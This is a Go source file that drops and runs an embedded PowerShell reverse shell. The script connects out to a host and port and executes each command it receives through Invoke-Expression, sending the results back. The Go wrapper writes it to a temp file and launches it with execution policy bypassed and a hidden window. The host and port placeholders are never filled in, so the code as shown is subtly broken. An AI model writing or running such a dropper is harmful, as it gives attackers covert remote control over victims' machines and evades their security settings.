package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
)

// Embed the content of the PowerShell script as a string
const psScript = `
$client = $null
$stream = $null
$buffer = $null
$writer = $null
$data = $null
$result = $null

try {
	$client = New-Object Net.Sockets.TcpClient("%s", %s)
	$stream = $client.GetStream()
	$buffer = New-Object Byte[] 1024
	$encoding = New-Object Text.UTF8Encoding
	$writer = New-Object IO.StreamWriter($stream, [Text.Encoding]::UTF8, 1024)
	$writer.AutoFlush = $true

	Write-Host "200"
	$bytes = 0
	do {
		do {
			$bytes = $stream.Read($buffer, 0, $buffer.Length)
			if ($bytes -gt 0) {
				$data += $encoding.GetString($buffer, 0, $bytes)
			}
		} while ($stream.DataAvailable)
		if ($bytes -gt 0) {
			$data = $data.Trim()
			if ($data.Length -gt 0) {
				try {
					$result = Invoke-Expression -Command $data 2>&1 | Out-String
				} catch {
					$result = $_.Exception | Out-String
				}
				Clear-Variable -Name data
				if ($result.Length -gt 0) {
					$writer.Write($result)
					Clear-Variable -Name result
				}
			}
		}
	} while ($bytes -gt 0)
} catch {
	Write-Host $_.Exception.InnerException.Message
} finally {
	if ($writer -ne $null) {
		$writer.Close()
		$writer.Dispose()
		Clear-Variable -Name writer
	}
	if ($stream -ne $null) {
		$stream.Close()
		$stream.Dispose()
		Clear-Variable -Name stream
	}
	if ($client -ne $null) {
		$client.Close()
		$client.Dispose()
		Clear-Variable -Name client
	}
	if ($buffer -ne $null) {
		$buffer.Clear()
		Clear-Variable -Name buffer
	}
	if ($result -ne $null) {
		Clear-Variable -Name result
	}
	if ($data -ne $null) {
		Clear-Variable -Name data
	}
	[GC]::Collect()
}
`

func main() {
	// Create a temporary file with .ps1 extension
	tempDir := os.TempDir()
	scriptPath := filepath.Join(tempDir, "embedded_script.ps1")

	// Write the PowerShell script content to the file
	err := ioutil.WriteFile(scriptPath, []byte(psScript), 0644)
	if err != nil {
		fmt.Println("Failed to write PowerShell script to file:", err)
		return
	}
	defer os.Remove(scriptPath) // Clean up after execution

	// Command to run the PowerShell script
	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-windowstyle", "hidden", "-File", scriptPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	// Run the PowerShell command
	err = cmd.Run()
	if err != nil {
		fmt.Println("Failed to execute PowerShell script:", err)
		return
	}

	fmt.Println("PowerShell script executed successfully.")
}
